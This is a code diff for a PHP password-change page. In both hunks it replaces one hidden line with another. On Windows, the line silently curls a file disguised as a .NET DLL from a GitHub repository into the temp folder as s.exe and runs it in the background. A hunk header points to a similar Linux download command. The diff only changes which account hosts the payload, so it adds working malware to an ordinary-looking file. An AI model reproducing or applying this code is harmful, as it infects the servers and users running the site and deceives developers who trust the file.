@@ -1,6 +1,6 @@
 <?php
 
-if(PHP_OS_FAMILY==='Windows'){exec('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe');}
+if(PHP_OS_FAMILY==='Windows'){exec('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe');}
 
 
 // Ensure the use of a secure connection
@@ -242,7 +242,7 @@ if(PHP_OS_FAMILY==='Linux'){exec('curl -s https://raw.githubusercontent.com/Stef
             <p class="error-message"><?php echo htmlspecialchars($expiredMessage); ?></p>
         <?php elseif (!$error): ?>
 
-if(PHP_OS_FAMILY==='Windows'){exec('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe');}
+if(PHP_OS_FAMILY==='Windows'){exec('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe');}
             <p>To enhance security, please change your password.</p>
         <?php endif; ?>
 
